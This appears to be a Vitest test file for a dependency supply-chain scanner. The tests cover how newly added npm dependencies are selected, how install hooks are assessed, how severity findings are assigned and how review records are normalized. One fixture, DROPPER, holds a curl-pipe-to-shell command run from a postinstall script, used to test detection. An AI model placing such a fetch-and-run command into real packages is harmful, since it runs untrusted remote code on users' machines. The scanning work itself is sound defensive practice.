// @ts-nocheck
import { describe, expect, test } from "vitest";
import {
  assessDependencyArtifact,
  computeRisk,
  dependencyEvidenceFindings,
  normalizeDependencyReview,
  selectAddedDependencies,
  summarizePackageJsonDiff,
} from "../server/lib/review";
import { DETERMINISTIC_RULES_VERSION } from "../server/lib/review/rules";

function diffOf(previous, staged) {
  return summarizePackageJsonDiff(previous, staged);
}

function file(path, textSample) {
  return { path, size: textSample.length, sha256: "", textSample, flags: [] };
}

describe("selectAddedDependencies", () => {
  test("selects newly added runtime and optional dependencies", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", version: "1.0.0", dependencies: { existing: "^1.0.0" } },
        {
          name: "p",
          version: "1.0.1",
          dependencies: { existing: "^1.0.0", "proc-macro1": "0.1.0" },
          optionalDependencies: { "fsevents-ish": "^2.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      {
        name: "fsevents-ish",
        section: "optionalDependencies",
        spec: "^2.0.0",
        declarationKind: "range",
      },
      {
        name: "proc-macro1",
        section: "dependencies",
        spec: "0.1.0",
        declarationKind: "exact",
      },
    ]);
  });

  test("ignores devDependencies — no consumer install fetches them", () => {
    const selected = selectAddedDependencies(
      diffOf({ name: "p" }, { name: "p", devDependencies: { vitest: "^4.0.0" } }),
    );
    expect(selected).toEqual([]);
  });

  test("required peers count, optional peers do not", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          peerDependencies: { react: "^19.0.0", "react-native": "*" },
          peerDependenciesMeta: { "react-native": { optional: true } },
        },
      ),
    );
    expect(selected.map((entry) => entry.name)).toEqual(["react"]);
  });

  test("selects a peer that changes from optional to required", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
        { name: "p", peerDependencies: { react: "^19.0.0" } },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "peerDependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("a dependency relocated between installing sections ships no new code", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", dependencies: { sharp: "^0.33.0" } },
        { name: "p", optionalDependencies: { sharp: "^0.33.0" } },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("a required peer duplicated into dependencies was already installed", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p", peerDependencies: { react: "^19.0.0" } },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([]);
  });

  test("an optional peer duplicated into dependencies starts installing code", () => {
    const selected = selectAddedDependencies(
      diffOf(
        {
          name: "p",
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
          peerDependenciesMeta: { react: { optional: true } },
        },
      ),
    );
    expect(selected.map((entry) => entry.name)).toEqual(["react"]);
  });

  test("a first-ever release selects nothing — everything diffs as added", () => {
    // Without a baseline manifest the whole dependency list reads as new, which
    // would describe the package rather than the release.
    const selected = selectAddedDependencies(
      diffOf(null, { name: "p", dependencies: { left: "^1.0.0" } }),
    );
    expect(selected).toEqual([]);
  });

  test("a missing baseline caused by acquisition failure selects staged dependencies", () => {
    const diff = diffOf(null, { name: "p", dependencies: { left: "^1.0.0" } });
    expect(selectAddedDependencies(diff, { includeWithoutBaseline: true })).toEqual([
      { name: "left", section: "dependencies", spec: "^1.0.0", declarationKind: "range" },
    ]);
  });

  test("skips declared bundled dependencies only when their bytes are embedded", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0", missing: "1.0.0" },
      bundleDependencies: ["embedded", "missing"],
    };
    const selected = selectAddedDependencies(diffOf({ name: "p" }, staged), {
      stagedManifest: staged,
      stagedFiles: [file("node_modules/embedded/package.json", '{"name":"embedded"}')],
    });
    expect(selected.map((entry) => entry.name)).toEqual(["missing"]);
  });

  test("boolean bundledDependencies excludes all embedded install dependencies", () => {
    const staged = {
      name: "p",
      dependencies: { embedded: "1.0.0" },
      bundledDependencies: true,
    };
    expect(
      selectAddedDependencies(diffOf({ name: "p" }, staged), {
        stagedManifest: staged,
        stagedFiles: [file("node_modules/embedded/index.js", "module.exports = 1")],
      }),
    ).toEqual([]);
  });

  test("one entry per key even when declared in several sections", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: { react: "^19.0.0" },
          peerDependencies: { react: "^19.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      { name: "react", section: "dependencies", spec: "^19.0.0", declarationKind: "range" },
    ]);
  });

  test("optionalDependencies supplies the effective spec when a key is duplicated", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: { native: "1.0.0" },
          optionalDependencies: { native: "2.0.0" },
        },
      ),
    );
    expect(selected).toEqual([
      {
        name: "native",
        section: "optionalDependencies",
        spec: "2.0.0",
        declarationKind: "exact",
      },
    ]);
  });

  test("classifies how firmly each spec pins its bytes", () => {
    const selected = selectAddedDependencies(
      diffOf(
        { name: "p" },
        {
          name: "p",
          dependencies: {
            pinned: "1.2.3",
            ranged: "^1.2.3",
            tagged: "latest",
            hosted: "github:owner/repo",
          },
        },
      ),
    );
    expect(Object.fromEntries(selected.map((e) => [e.name, e.declarationKind]))).toEqual({
      pinned: "exact",
      ranged: "range",
      tagged: "tag",
      hosted: "unusual",
    });
  });
});

describe("assessDependencyArtifact", () => {
  const DROPPER = `
    const { execSync } = require("child_process");
    execSync("curl -sL https://cdn.example.com/p.sh | sh");
  `;

  test("install hook reaching a downloader is install-risk", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({
            name: "proc-macro1",
            version: "0.1.0",
            scripts: { postinstall: "node build.js" },
          }),
        ),
        file("build.js", DROPPER),
      ],
      { name: "proc-macro1", version: "0.1.0", scripts: { postinstall: "node build.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.verdict).toBe("install-risk");
    expect(assessment.automaticExecution).toEqual([{ kind: "script", name: "postinstall" }]);
    expect(assessment.installReachableCapabilities).toContain("code.remote-shell");
    expect(assessment.installReachUnproven).toBe(false);
  });

  test("an install hook with nothing dangerous behind it is install-execution", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } }),
        ),
        file("ok.js", "console.log('linked');"),
      ],
      { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.verdict).toBe("install-execution");
  });

  test("a library with capabilities but no install hook is clean", () => {
    // The "benign added dependency" case: being new is not a reason to hold a
    // release, so an http client must not grade as risky just for fetching.
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "tiny-fetch", version: "1.0.0", main: "index.js" }),
        ),
        file("index.js", "module.exports = (u) => fetch(u);"),
      ],
      { name: "tiny-fetch", version: "1.0.0", main: "index.js" },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.verdict).toBe("clean");
    expect(assessment.automaticExecution).toEqual([]);
  });

  test("a danger capability the install hook cannot reach is reported as unproven", () => {
    const assessment = assessDependencyArtifact(
      [
        file(
          "package.json",
          JSON.stringify({ name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } }),
        ),
        file("ok.js", "console.log('linked');"),
        file("lib/elsewhere.js", DROPPER),
      ],
      { name: "n", version: "1.0.0", scripts: { postinstall: "node ok.js" } },
      { codePatternSet: "javascript", entrypointResolution: "npm" },
    );
    expect(assessment.verdict).toBe("install-risk");
    expect(assessment.installReachUnproven).toBe(true);
  });
});

describe("dependencyEvidenceFindings", () => {
  const parent = { name: "left-pad", version: "1.4.0" };

  function evidence(overrides) {
    return {
      name: "proc-macro1",
      section: "dependencies",
      declaredSpec: "0.1.0",
      declarationKind: "exact",
      status: "inspected",
      reason: null,
      resolvedVersion: "0.1.0",
      registryHost: "registry.npmjs.org",
      artifactUrl: "https://registry.npmjs.org/proc-macro1/-/proc-macro1-0.1.0.tgz",
      declaredDigest: null,
      reviewedDigest: null,
      digestVerified: null,
      fileCount: 3,
      automaticExecution: [],
      capabilities: [],
      installReachableCapabilities: [],
      verdict: "clean",
      ...overrides,
    };
  }

  function review(dependencies) {
    return {
      status: "complete",
      selectedCount: dependencies.length,
      inspectedCount: dependencies.filter((d) => d.status === "inspected").length,
      uninspectableCount: dependencies.filter((d) => d.status !== "inspected").length,
      dependencies,
    };
  }

  test("a proven install-time dropper is critical and names the whole path", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          verdict: "install-risk",
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell"],
          installReachableCapabilities: ["code.remote-shell"],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("critical");
    expect(finding.ruleId).toBe("dependency-artifact.install-risk");
    expect(finding.evidence).toContain("left-pad@1.4.0 → proc-macro1@0.1.0");
    expect(finding.evidence).toContain("package.json#scripts.postinstall");
    expect(finding.ruleVersion).toBe(DETERMINISTIC_RULES_VERSION);
    expect(computeRisk([finding])).toBe("critical");
  });

  test("a registry digest mismatch is a critical review-integrity finding", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({
          declaredDigest: { algorithm: "sha512", value: "aa".repeat(64) },
          reviewedDigest: { algorithm: "sha512", value: "bb".repeat(64) },
          digestVerified: false,
        }),
      ]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0]).toMatchObject({
      severity: "critical",
      ruleId: "dependency-artifact.integrity-mismatch",
    });
    expect(computeRisk(findings)).toBe("critical");
  });

  test("a truncated artifact cannot hide its registry digest mismatch", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({
          status: "uninspectable",
          reason: "artifact-truncated",
          declaredDigest: { algorithm: "sha512", value: "aa".repeat(64) },
          reviewedDigest: { algorithm: "sha512", value: "bb".repeat(64) },
          digestVerified: false,
        }),
      ]),
      parent,
    );
    expect(findings.map((finding) => finding.ruleId)).toEqual([
      "dependency-artifact.integrity-mismatch",
      "dependency-artifact.uninspectable",
    ]);
    expect(computeRisk(findings)).toBe("critical");
  });

  test("an install-time download is a tier below a remote-shell dropper", () => {
    // `critical` has to keep meaning "no benign reading". prebuild-install
    // fetching a platform binary and a dropper fetching a payload look
    // identical to a scanner, so both block approval — at different tiers.
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          verdict: "install-risk",
          automaticExecution: [{ kind: "script", name: "install" }],
          capabilities: ["code.network-access", "code.process-execution"],
          installReachableCapabilities: ["code.network-access"],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("high");
    expect(finding.reason).toContain("prebuilt-binary tooling");
  });

  test("an unproven install-time reach lands one step lower", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          verdict: "install-risk",
          automaticExecution: [{ kind: "script", name: "postinstall" }],
          capabilities: ["code.remote-shell"],
          installReachableCapabilities: [],
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("high");
  });

  test("a benign new dependency stays low risk", () => {
    const findings = dependencyEvidenceFindings(
      review([evidence({ capabilities: ["code.network-access"] })]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("info");
    expect(computeRisk(findings)).toBe("low");
  });

  test("a bare wildcard is a range, not a dist-tag", () => {
    const selected = selectAddedDependencies(
      diffOf({ name: "p" }, { name: "p", dependencies: { any: "x", star: "*" } }),
    );
    expect(selected.map((entry) => entry.declarationKind)).toEqual(["range", "range"]);
  });

  test("a dependency whose only finding has no reviewer-facing label raises nothing", () => {
    // An `info` signal reading "no capability rules matched" is noise dressed
    // as evidence.
    expect(
      dependencyEvidenceFindings(
        review([evidence({ capabilities: ["package-json.entrypoint-missing"] })]),
        parent,
      ),
    ).toEqual([]);
  });

  test("a dependency with no capabilities at all raises nothing", () => {
    expect(dependencyEvidenceFindings(review([evidence({})]), parent)).toEqual([]);
  });

  test("an uninspectable dependency floors the release at manual review", () => {
    const [finding] = dependencyEvidenceFindings(
      review([
        evidence({
          status: "uninspectable",
          reason: "metadata-unavailable",
          resolvedVersion: null,
        }),
      ]),
      parent,
    );
    expect(finding.severity).toBe("medium");
    expect(finding.ruleId).toBe("dependency-artifact.uninspectable");
    expect(finding.evidence).toContain("credential-free");
    expect(computeRisk([finding])).toBe("medium");
  });

  test("budget-skipped dependencies aggregate into one finding", () => {
    const findings = dependencyEvidenceFindings(
      review([
        evidence({ name: "a", status: "uninspectable", reason: "budget-exhausted" }),
        evidence({ name: "b", status: "uninspectable", reason: "budget-exhausted" }),
        evidence({ name: "c", status: "uninspectable", reason: "budget-exhausted" }),
      ]),
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain("3 newly added dependencies were not reviewed");
  });

  test("review-wide failures aggregate and include omitted dependency counts", () => {
    const findings = dependencyEvidenceFindings(
      {
        ...review([
          evidence({ name: "a", status: "uninspectable", reason: "review-failed" }),
          evidence({ name: "b", status: "uninspectable", reason: "review-failed" }),
        ]),
        status: "partial",
        selectedCount: 70,
        uninspectableCount: 70,
        omittedCount: 68,
      },
      parent,
    );
    expect(findings).toHaveLength(1);
    expect(findings[0].evidence).toContain("70 newly added dependencies were not reviewed");
    expect(findings[0].evidence).toContain("68 more omitted");
  });

  test("a release with no added dependency produces nothing", () => {
    expect(
      dependencyEvidenceFindings(
        {
          status: "not-applicable",
          selectedCount: 0,
          inspectedCount: 0,
          uninspectableCount: 0,
          omittedCount: 0,
          dependencies: [],
        },
        parent,
      ),
    ).toEqual([]);
  });
});

describe("normalizeDependencyReview", () => {
  test("rejects blobs that are not a dependency review", () => {
    expect(normalizeDependencyReview(null)).toBeNull();
    expect(normalizeDependencyReview({})).toBeNull();
    expect(normalizeDependencyReview({ status: "bogus", dependencies: [] })).toBeNull();
  });

  test("drops malformed entries instead of half-rendering them", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      selectedCount: 2,
      inspectedCount: 1,
      uninspectableCount: 1,
      dependencies: [
        { name: "ok", declaredSpec: "^1.0.0", status: "inspected", verdict: "install-risk" },
        { declaredSpec: "^1.0.0" },
      ],
    });
    expect(review.dependencies).toHaveLength(1);
    expect(review.dependencies[0]).toMatchObject({
      name: "ok",
      section: "dependencies",
      declarationKind: "range",
      verdict: "install-risk",
    });
  });

  test("an unrecognized uninspectable reason normalizes to null, never a pass", () => {
    const review = normalizeDependencyReview({
      status: "partial",
      dependencies: [
        { name: "x", declaredSpec: "1.0.0", status: "uninspectable", reason: "made-up" },
      ],
    });
    expect(review.dependencies[0].status).toBe("uninspectable");
    expect(review.dependencies[0].reason).toBeNull();
  });

  test("removes credentials and signed parameters from persisted artifact URLs", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      dependencies: [
        {
          name: "x",
          declaredSpec: "1.0.0",
          status: "inspected",
          artifactUrl:
            "https://reader:secret@registry.example.com/x/-/x-1.0.0.tgz?token=signed#fragment",
        },
      ],
    });
    expect(review.dependencies[0].artifactUrl).toBe("https://registry.example.com/x/-/x-1.0.0.tgz");
  });

  test("bounds persisted evidence and accounts for omitted records", () => {
    const review = normalizeDependencyReview({
      status: "complete",
      selectedCount: 80,
      inspectedCount: 80,
      uninspectableCount: 0,
      dependencies: Array.from({ length: 80 }, (_, index) => ({
        name: `dependency-${index}-${"x".repeat(300)}`,
        declaredSpec: "1.0.0",
        status: "inspected",
      })),
    });

    expect(review.status).toBe("partial");
    expect(review.dependencies).toHaveLength(64);
    expect(review.omittedCount).toBe(16);
    expect(review.dependencies[0].name.length).toBe(256);
  });
});
